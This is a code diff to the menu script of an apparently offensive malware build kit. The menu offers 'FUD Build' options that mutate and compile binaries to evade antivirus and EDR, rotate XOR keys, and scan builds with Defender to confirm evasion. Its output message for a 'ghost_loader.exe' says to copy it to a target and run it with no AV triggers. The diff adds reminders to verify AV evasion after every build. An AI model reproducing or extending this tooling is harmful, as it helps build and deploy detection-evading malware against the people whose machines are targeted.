@@ -199,7 +199,7 @@ def render():
         ("X", "FUD Build",      "Metamorph + mutate + compile — evades AV/EDR", RED),
         ("F", "Fresh Build",    "Mutate + auto-IP + compile + scan", PINK),
         ("1", "Compile Only",   "Build without mutation",            AMBER),
-        ("2", "Scan All",       "Defender check all binaries",       RED),
+        ("2", "Scan All",       "Defender check ALL binaries — run after EVERY build to verify FUD", RED),
         ("4", "Mutate Keys",    "Rotate XOR keys + recompile",      AMBER),
         ("6", "Key Status",     "Show current mutation keys",        AMBER),
     ]
@@ -464,6 +464,7 @@ def run_ghost():
         if os.path.exists(out):
             print(f"\n  {GREEN}[+] Output: shell/ghost_loader.exe{RST}")
             print(f"  {DIM}  Copy to target. Run as any user. No AV triggers.{RST}")
+            scan_reminder()
 
 
 def prompt_ip(default="192.168.1.92"):
@@ -550,6 +551,11 @@ def fresh_build(mutate, deploy, fud=False):
         print(f"  {DIM}Defender signatures are worthless against polymorphic builds.{RST}\n")
 
 
+def scan_reminder():
+    print(f"\n  {RED}>>> ALWAYS run [2] Scan All after any build to verify AV evasion <<<{RST}")
+    print(f"  {DIM}    python deploy.py --status  — checks all binaries including ghost_loader.exe{RST}\n")
+
+
 def run_op(choice):
     deploy = os.path.join(ROOT, "deploy.py")
     mutate = os.path.join(ROOT, "mutate.py")
@@ -560,6 +566,7 @@ def run_op(choice):
 
     if choice == "1":
         subprocess.run([sys.executable, deploy, "--compile"], cwd=ROOT)
+        scan_reminder()
     elif choice == "2":
         subprocess.run([sys.executable, deploy, "--status"], cwd=ROOT)
     elif choice == "3":
